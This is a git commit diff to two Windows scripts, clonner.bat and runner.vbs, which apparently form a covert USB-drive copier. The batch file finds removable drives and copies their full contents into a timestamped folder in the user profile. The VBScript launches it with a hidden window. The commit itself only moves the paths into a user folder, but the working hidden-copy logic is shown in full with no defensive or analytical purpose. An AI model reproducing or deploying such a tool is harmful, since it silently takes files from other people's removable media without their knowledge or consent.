897f36bae9bcca33c910242faa5c1c5794afeabf
Mestik78 <mestik78@gmail.com>
2022-02-07 16:19:03 +0100

    User Folder

--- clonner.bat
+++ clonner.bat
@@ -5,7 +5,7 @@ for /F "tokens=1*" %%a in ('fsutil fsinfo drives') do (
    for %%c in (%%b) do (
       for /F "tokens=3" %%d in ('fsutil fsinfo drivetype %%c') do (
          if %%d equ Removable (            
-            xcopy %%c\ C:\copies\%date:~7,2%-%date:~3,2%-%date:~10,4%-%time:~0,2%-%time:~3,2%\ /E
+            xcopy %%c\ "C:\Users\USER\copies\%date:~7,2%-%date:~3,2%-%date:~10,4%-%time:~0,2%-%time:~3,2%\" /E /Y
          )
       )
    )
--- runner.vbs
+++ runner.vbs
@@ -1,3 +1,3 @@
 Set WshShell = CreateObject("WScript.Shell") 
-WshShell.Run chr(34) & "C:\clonner.bat" & Chr(34), 0
+WshShell.Run chr(34) & "C:\Users\USER\clonner.bat" & Chr(34), 0
 Set WshShell = Nothing
